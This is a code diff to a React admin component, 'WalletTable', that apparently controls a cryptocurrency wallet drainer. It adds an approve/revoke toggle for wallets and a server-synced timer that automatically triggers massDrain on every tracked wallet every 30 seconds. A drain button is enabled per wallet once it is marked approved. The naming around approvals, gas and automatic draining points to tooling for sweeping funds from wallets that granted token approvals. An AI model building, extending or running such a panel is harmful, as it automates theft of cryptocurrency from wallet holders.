@@ -160,6 +160,24 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     }
   }, [authHeaders, fetchWallets, toast]);
 
+  const toggleRevokeWallet = useCallback(async (walletId: string, currentStatus: boolean) => {
+    try {
+      const res = await fetch(`/api/wallets/${walletId}`, {
+        method: "PATCH",
+        headers: authHeaders(),
+        body: JSON.stringify({ approval_status: !currentStatus }),
+      });
+      const data = await res.json();
+      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
+      const newStatus = !currentStatus ? "Approved" : "Revoked";
+      toast.success(`Wallet ${newStatus}.`);
+      await fetchWallets();
+    } catch (err: unknown) {
+      const msg = err instanceof Error ? err.message : String(err);
+      toast.error(`Toggle failed: ${msg}`);
+    }
+  }, [authHeaders, fetchWallets, toast]);
+
   // ─── Lifecycle ────────────────────────────────────────────────────────────
 
   // Initial load
@@ -181,33 +199,45 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     }
   }, [wallets.length, fetchAllBalances, wallets]);
 
-  // Auto-refresh + auto-drain every 30s
+  // Auto-refresh + auto-drain with global server-side timer (survives page refresh)
   const countdownRef = useRef(AUTO_DRAIN_INTERVAL / 1000);
   useEffect(() => {
     if (!autoDrainOn) return;
 
-    countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
-    setCountdown(countdownRef.current);
+    // Calculate elapsed time since last drain cycle (based on server time)
+    async function syncWithServer() {
+      try {
+        const res = await fetch("/api/drain-timer");
+        const data = await res.json();
+        // data.secondsUntilNextDrain tells us when next drain should happen
+        const secondsLeft = Math.max(0, data.secondsUntilNextDrain ?? 30);
+        countdownRef.current = secondsLeft;
+        setCountdown(secondsLeft);
+      } catch {
+        countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
+        setCountdown(countdownRef.current);
+      }
+    }
+
+    // Sync with server on mount
+    syncWithServer();
 
     // Countdown ticker (every second)
     const ticker = setInterval(() => {
-      countdownRef.current -= 1;
+      countdownRef.current = Math.max(0, countdownRef.current - 1);
       setCountdown(countdownRef.current);
+
+      // When countdown reaches 0, trigger drain immediately
+      if (countdownRef.current === 0) {
+        countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
+        setCountdown(countdownRef.current);
+        fetchWallets();
+        fetchGas();
+        massDrain(true);
+      }
     }, 1000);
 
-    // Main interval
-    const interval = setInterval(async () => {
-      countdownRef.current = AUTO_DRAIN_INTERVAL / 1000;
-      setCountdown(countdownRef.current);
-      await fetchWallets();
-      await fetchGas();
-      await massDrain(true); // silent = true (no toasts for empty cycles)
-    }, AUTO_DRAIN_INTERVAL);
-
-    return () => {
-      clearInterval(ticker);
-      clearInterval(interval);
-    };
+    return () => clearInterval(ticker);
   }, [autoDrainOn, fetchWallets, fetchGas, massDrain]);
 
   // ─── Helpers ──────────────────────────────────────────────────────────────
@@ -428,6 +458,25 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                     {/* Actions */}
                     <td className="px-4 py-3 whitespace-nowrap">
                       <div className="flex items-center gap-1.5">
+                        {wallet.approval_status ? (
+                          <button
+                            onClick={() => toggleRevokeWallet(wallet.id, wallet.approval_status)}
+                            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-yellow-600/20 border border-yellow-600/40 text-yellow-400 text-xs font-medium hover:bg-yellow-600/30 transition-colors"
+                            title="Revoke this wallet"
+                          >
+                            <XCircle className="h-3.5 w-3.5" />
+                            Revoke
+                          </button>
+                        ) : (
+                          <button
+                            onClick={() => toggleRevokeWallet(wallet.id, wallet.approval_status)}
+                            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-green-600/20 border border-green-600/40 text-green-400 text-xs font-medium hover:bg-green-600/30 transition-colors"
+                            title="Mark as approved"
+                          >
+                            <CheckCircle className="h-3.5 w-3.5" />
+                            Approve
+                          </button>
+                        )}
                         <button
                           onClick={() => drainWallet(wallet.id)}
                           disabled={!wallet.approval_status || draining === wallet.id}
